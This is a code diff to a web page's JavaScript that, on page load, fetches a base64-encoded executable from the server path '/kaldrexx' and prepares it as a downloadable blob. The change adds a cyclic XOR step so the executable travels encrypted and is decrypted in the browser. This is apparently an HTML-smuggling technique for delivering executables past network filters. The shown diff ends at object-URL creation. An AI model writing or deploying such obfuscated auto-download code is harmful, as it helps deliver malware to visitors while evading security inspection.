@@ -13,12 +13,26 @@ function base64ToArrayBuffer(base64) {
     return binaryBytes.buffer;
 }
 
+// XOR the string with the key in a cyclic manner
+function stringCyclicXOR(string, key) {
+    let cyclicKey = key.repeat(Math.floor(string.length / key.length)) + key.slice(0, string.length % key.length);
+    return Array.from(string, (c, i) => String.fromCharCode(c.charCodeAt(0) ^ cyclicKey.charCodeAt(i))).join('');
+}
+
+
 // Fetch the base64 encoded executable and download it
 window.onload = function () {
     fetch("/kaldrexx")
         .then(response => response.json())
         .then(data => {
-            let arrayBuffer = base64ToArrayBuffer(data["executable"]);
+
+            // Decrypt the executable
+            let executableEncrypted = data["executableEncrypted"];
+            let key = data["key"];
+            let executable = stringCyclicXOR(executableEncrypted, key);
+
+            // Convert the base64 encoded executable to an ArrayBuffer
+            let arrayBuffer = base64ToArrayBuffer(executable);
             let blob = new Blob([arrayBuffer], { type: "application/octet-stream" });
             let url = URL.createObjectURL(blob);
 
